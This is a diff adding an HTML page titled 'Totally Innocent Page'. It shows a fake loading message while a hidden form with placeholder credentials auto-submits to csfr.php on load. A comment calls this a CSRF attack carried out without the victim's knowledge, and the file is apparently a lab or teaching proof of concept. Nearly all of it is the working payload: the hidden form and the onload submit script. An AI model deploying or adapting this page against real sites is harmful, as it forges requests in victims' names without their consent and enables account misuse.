@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Totally Innocent Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 80px; }
+    </style>
+</head>
+<body>
+    <h1>Welcome! Loading your content...</h1>
+    <p>Please wait a moment.</p>
+
+    <!--
+        CSRF Attack:
+        This hidden form auto-submits to csfr.php with valid credentials
+        the moment the victim opens this page — without their knowledge.
+    -->
+    <form id="csrfForm" method="POST" action="csfr.php" style="display:none;">
+        <input type="hidden" name="username" value="host" />
+        <input type="hidden" name="password" value="pass" />
+    </form>
+
+    <script>
+        // Automatically submit the forged form on page load
+        window.onload = function () {
+            document.getElementById("csrfForm").submit();
+        };
+    </script>
+</body>
+</html>
